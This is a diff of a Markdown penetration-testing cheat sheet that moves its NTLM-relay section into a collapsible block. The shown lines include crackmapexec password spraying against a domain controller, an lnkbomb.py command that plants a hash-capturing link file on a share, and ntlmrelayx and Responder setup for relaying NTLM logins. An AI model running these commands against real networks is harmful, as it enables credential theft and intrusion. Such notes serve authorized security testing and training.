@@ -232,19 +232,20 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
   python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows -r dicnwdsebl.url
   ```
 </details>
-  
-  ### Crackmapexec NTLM-relay
-  #### Evaluate no smb-signing and create an IP txt file for TLMRelayx
+<details>
+  <summary> Crackmapexec NTLM-relay </summary>   
+
+  ### Evaluate no smb-signing and create an IP txt file for TLMRelayx
   ```bash
   crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
   ```
 
-  #### NTLMRelayx
+  ### NTLMRelayx
   ```bash
   sudo python3 ntlmrelayx.py -smb2support -tf <outputIPs.txt>
   ```
 
-  #### Disbale SMB and HTTP in Responder.conf
+  ### Disbale SMB and HTTP in Responder.conf
   ```bash
   [Responder Core]
 
